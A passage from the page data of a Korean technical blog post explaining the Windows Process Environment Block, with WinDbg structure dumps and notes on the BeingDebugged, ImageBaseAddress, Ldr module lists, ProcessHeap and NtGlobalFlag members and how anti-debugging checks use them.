Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x320</span> SparePointers    <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x340</span> SpareUlongs      <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x358</span> WerRegistrationData <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x360</span> WerShipAssertPtr <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x368</span> pUnused          <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x370</span> pImageHeaderHash <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> TracingFlags     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> HeapTracingEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> CritSecTracingEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> LibLoaderTracingEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> SpareTracingBits <span class=\"token operator\">:</span> Pos <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span> Bits\n   <span class=\"token operator\">+</span><span class=\"token number\">0x37c</span> Padding6         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x380</span> CsrServerReadOnlySharedMemoryBase <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x388</span> TppWorkerpListLock <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x390</span> TppWorkerpList   <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x3a0</span> WaitOnAddressHashTable <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7a0</span> TelemetryCoverageHeader <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7a8</span> CloudFileFlags   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7ac</span> CloudFileDiagFlags <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7b0</span> PlaceholderCompatibilityMode <span class=\"token operator\">:</span> Char\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7b1</span> PlaceholderCompatibilityModeReserved <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> Char\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7b8</span> LeapSecondData   <span class=\"token operator\">:</span> Ptr64 _LEAP_SECOND_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c0</span> LeapSecondFlags  <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c0</span> SixtySecondEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c0</span> Reserved         <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span> Bits\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c4</span> NtGlobalFlag2    <span class=\"token operator\">:</span> Uint4B</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">tdll<span class=\"token operator\">!</span>_PEB \n   <span class=\"token operator\">+</span><span class=\"token number\">0x002</span> BeingDebugged    <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> ImageBaseAddress <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x018</span> Ldr              <span class=\"token operator\">:</span> Ptr64 _PEB_LDR_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x030</span> ProcessHeap      <span class=\"token operator\">:</span> Ptr64 Void</code></pre></div>\n<h2 id=\"pebbeingdebugged\" style=\"position:relative;\"><a href=\"#pebbeingdebugged\" aria-label=\"pebbeingdebugged permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.BeingDebugged</h2>\n<ul>\n<li>Kernel32!IsDebuggerPresent() API</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">BOOL WINAPI <span class=\"token function\">IsDebuggerPresent</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>현재 프로세스가 디버깅을 당하는지를 판단해서 결과를 반환한다.</li>\n<li>API가 참조하는 정보가 바로 PEB.BeingDebugged 멤버이다. (디버깅 중이면1, 아니면 0을 반환)</li>\n</ul>\n<h2 id=\"pebimagebaseaddress\" style=\"position:relative;\"><a href=\"#pebimagebaseaddress\" aria-label=\"pebimagebaseaddress permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.ImageBaseAddress</h2>\n<ul>\n<li>PEB.ImageBaseAddress 멤버는 프로세스의 ImageBase 를 표시한다.</li>\n<li>GetModuleHandle() API는 ImageBase를 얻어내는 API이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">HMOUDLE WINAPI <span class=\"token function\">GetModuleHandle</span> <span class=\"token punctuation\">(</span>\n\t__in_opt  LPCTSTR lpModuleName\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>lpModuleName 파라미터에 NULL을 입력하고 GetModuleHandle()을 호출하면 프로세스가 로딩된 ImageBase를 리턴한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjklEQVQI11XL3QqCMBjGce//HqLzbqC76CgMmU5ci9yYr/vAvVvqFmYEwY/n6PkX6kl5W2nBGLmiFi8rCTlV9ZGXh4GeVzQ56K9oZidR1FG1CSEHXYBgrCmNvEveJA/eDhdKnYHF4mrH/fSzTEPykHHcbHHfdXVp1QN1n2cXnOTdLUedI2wb/iwe0ifbvQEgE6fbOMXfJwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/9e888556dc76a2d9f49f2c740922e0b7/37523/1.png\"\n        srcset=\"/static/9e888556dc76a2d9f49f2c740922e0b7/e9ff0/1.png 180w,\n/static/9e888556dc76a2d9f49f2c740922e0b7/f21e7/1.png 360w,\n/static/9e888556dc76a2d9f49f2c740922e0b7/37523/1.png 720w,\n/static/9e888556dc76a2d9f49f2c740922e0b7/024d6/1.png 961w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>\n<p>PEB.ImageBaseAddress 멤버를 EAX 레지스터 에 세팅하는 것을 확인할 수 있다.</p>\n</li>\n</ul>\n<h2 id=\"pebldr\" style=\"position:relative;\"><a href=\"#pebldr\" aria-label=\"pebldr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.Ldr</h2>\n<ul>\n<li>_PEB_LDR_DATA 구조체의 포인터이다.</li>\n<li>_PEB_LDR_DAT 구조체</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_PEB_LDR_DATA</span> <span class=\"token punctuation\">{</span>\n  BYTE       Reserved1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID      Reserved2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  LIST_ENTRY InMemoryOrderModuleList<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> PEB_LDR_DATA<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PPEB_LDR_DATA<span class=\"token punctuation\">;</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0</span><span class=\"token operator\">:</span><span class=\"token number\">007</span><span class=\"token operator\">></span> dt _PEB_LDR_DATA\nntdll<span class=\"token operator\">!</span>_PEB_LDR_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> Length           <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x004</span> Initialized      <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x008</span> SsHandle         <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x00c</span> InLoadOrderModuleList <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x014</span> InMemoryOrderModuleList <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x01c</span> InInitializationOrderModuleList <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x024</span> EntryInProgress  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x028</span> ShutdownInProgress <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x02c</span> ShutdownThreadId <span class=\"token operator\">:</span> Ptr32 Void</code></pre></div>\n<ul>\n<li>프로세스에 로딩된 모듈(DLL)의 로딩 베이스 주소를 직접 구할 수 있는 방법을 제공하기 때문이다.</li>\n<li>_LIST_ENTRY 타입의 멤버가 세 개 있다.\n<ul>\n<li>InLoadOrderModuleList</li>\n<li>InMemoryOrderModuleList</li>\n<li>InInitializationOrderModuleList</li>\n</ul>\n</li>\n<li>_LIST_ENTRY 구조체 정의는</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LIST_ENTRY</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LIST_ENTRY</span> <span class=\"token operator\">*</span>Flink<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LIST_ENTRY</span> <span class=\"token operator\">*</span>Blink<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> LIST_ENTRY<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PLIST_ENTRY<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>구조체 정의를 보면 _LIST_ENTRY는 양방향 연결 리스트 메커니즘을 제공하는 구조체이다.</li>\n<li>연결 리스트에는 _LDR_DATA_TABLE_ENTRY 구조체 정보가 담겨 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LDR_DATA_TABLE_ENTRY</span> <span class=\"token punctuation\">{</span>\n    PVOID Reserved1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    LIST_ENTRY InMemoryOrderLinks<span class=\"token punctuation\">;</span>\n    PVOID Reserved2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    PVOID DllBase<span class=\"token punctuation\">;</span>\n    PVOID EntryPoint<span class=\"token punctuation\">;</span>\n    PVOID Reserved3<span class=\"token punctuation\">;</span>\n    UNICODE_STRING FullDllName<span class=\"token punctuation\">;</span>\n    BYTE Reserved4<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    PVOID Reserved5<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">union</span> <span class=\"token punctuation\">{</span>\n        ULONG CheckSum<span class=\"token punctuation\">;</span>\n        PVOID Reserved6<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    ULONG TimeDateStamp<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> LDR_DATA_TABLE_ENTRY<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PLDR_DATA_TABLE_ENTRY<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>프로세스에 로딩된 DLL 모듈 마다 _LDR_DATA_TABLE_ENTRY 구조체가 하나씩 생성되고 이 구조체 들은 _LIST_ENTRY 양방향 연결 리스트로 연결된다.</li>\n<li>_LDR_DATA_TABLE_ENTRY 구조체 들이 많이 있는 데 연결 방법을 세 가지를 제공한다.</li>\n</ul>\n<h2 id=\"pebprocessheap--pebntglobalflag\" style=\"position:relative;\"><a href=\"#pebprocessheap--pebntglobalflag\" aria-label=\"pebprocessheap  pebntglobalflag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB.ProcessHeap &#x26; PEB.NtGlobalFlag</h2>\n<ul>\n<li>PEB.ProcessHeap 멤버, PEB.NtGlobalFlag 멤버는 (PEB.BeingDebugged 멤버와 마찬가지로) 안티 디버깅에 사용된다.</li>\n<li>프로세스가 디버깅 중이라면 ProcessHeap, NtGlobalFlag 멤버는 특정한 값을 갖는다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#peb-%EC%A0%91%EA%B7%BC-%EB%B0%A9%EB%B2%95\">PEB 접근 방법</a></li>\n<li><a href=\"#method-1\">method 1</a></li>\n<li><a href=\"#method-2\">method 2</a></li>\n<li><a href=\"#peb-%EA%B5%AC%EC%A1%B0%EC%B2%B4-%EC%A0%95%EC%9D%98\">PEB 구조체 정의</a></li>\n<li><a href=\"#pebbeingdebugged\">PEB.BeingDebugged</a></li>\n<li><a href=\"#pebimagebaseaddress\">PEB.ImageBaseAddress</a></li>\n<li><a href=\"#pebldr\">PEB.Ldr</a></li>\n<li><a href=\"#pebprocessheap--pebntglobalflag\">PEB.ProcessHeap &#x26; PEB.NtGlobalFlag</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 03, 2021","title":"PEB (Process Environment Block)","categories":"Windows","author":"Zer0Luck","emoji":"🧊"},"fields":{"slug":"/window_1_theori/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/project_fuzz_/","nextSlug":"/php-sqlite3-1day-rce/","prevSlug":"/window_1_theori/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}